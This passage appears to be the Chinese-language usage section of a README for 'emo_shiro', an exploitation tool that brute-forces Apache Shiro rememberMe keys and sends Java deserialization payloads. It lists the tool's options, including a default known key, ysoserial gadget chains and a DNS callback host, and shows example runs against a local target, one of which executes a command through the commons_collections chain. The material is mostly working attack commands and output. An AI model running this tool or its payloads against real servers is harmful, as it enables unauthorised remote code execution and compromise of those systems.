## 使用方法

```bash
➜  ~ ./emo_shiro --help
Usage: emo_shiro [--key <key>] [-m <mode>] [-t <target>] [-s <ser>] [--file <file>] [--keys <keys>] [--csv <csv>] [--proxy <proxy>] [--timeout <timeout>] [--thread <thread>] [--exploit] [--dns <dns>] [-p <payload>] [-c <command>] [--echo-name <echo-name>] [--command-name <command-name>] [-l]

emo_shiro

Options:
  --key             you can specify known keys
  -m, --mode        apache-shiro encryption algorithm,default: CBC
  -t, --target      the target
  -s, --ser         serialize file
  --file            read the target from the file
  --keys            read the key from the file
  --csv             export to the csv file
  --proxy           proxy to use for requests
                    (ex:[http(s)|socks5(h)]://host:port)
  --timeout         set request timeout
  --thread          number of concurrent threads
  --exploit         exploit mode
  --dns             dns identifier, default: 981tzg.ceye.io
  -p, --payload     select a payload
  -c, --command     command to execute
  --echo-name       tomcat echo request header name
  --command-name    tomcat command request header name
  -l, --list        list all payload
  --help            display usage information

```

## 详细参数

- `--key`指定Key，默认`kPH+bIxk5D2deZiIxcaaaA==`
- `-m`指定加密模式，默认`CBC`,可选：`GCM`
- `-t`单个目标
- `-s`读入ysoserial生成的文件作为payload
- `--file`从文件读入目标
- `--keys`从文件读入key
- `--csv`导出到csv文件
- `--exploit`利用模式，爆破出key后，如果开启exploit模式会读入ysoserial生成的文件作为payload，如果`--ser`
  参数为空，则为`--dns`作为URL_DNS的参数生成payload
- `--dns`验证的DNS服务器，请求为目标的`主机名_端口.你的DNS记录服务器`，默认为`981tzg.ceye.io`
- `-p`使用内置payload，配合`-c`或者`--dns`和`--echo-name`，`--command-name`，tomcat回显后面再更新
- `-l`列出内置payload

## 使用ysoserial文件

```bash
➜  emo_shiro git:(main) ✗ cargo run -- -t http://127.0.0.1:8080 --exploit --ser /home/kali-team/1.ser                 
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=EAEAD8C3FA8884D816F575E55B654694 | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```

## 使用DNS记录验证漏洞

```bash
➜  emo_shiro git:(main) ✗ cargo run -- -t http://127.0.0.1:8080 --exploit --dns 981tzg.ceye.io
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=E01994D45911DE55FCE6606CFFF48AC7 | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```

## 使用内置ysoserial

- payload来自：(ysoserial_rs)[https://github.com/emo-cat/ysoserial_rs]
- 例如使用利用`commons_collections_k1`链执行命令，使用`-p`指定利用链，`-c`指定要执行的命令

```bash
➜  emo_shiro git:(main) ✗ cargo run -- -t http://127.0.0.1:8080 --exploit -p cck1 -c "ping qq.com"                                    
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+
| url                                                                     | method | verify | mode | key                      |
+=========================================================================+========+========+======+==========================+
| http://127.0.0.1:8080/login;jsessionid=5FAF1087D2448C017C2959B2AC02CDAF | GET    | true   | CBC  | kPH+bIxk5D2deZiIxcaaaA== |
+-------------------------------------------------------------------------+--------+--------+------+--------------------------+

```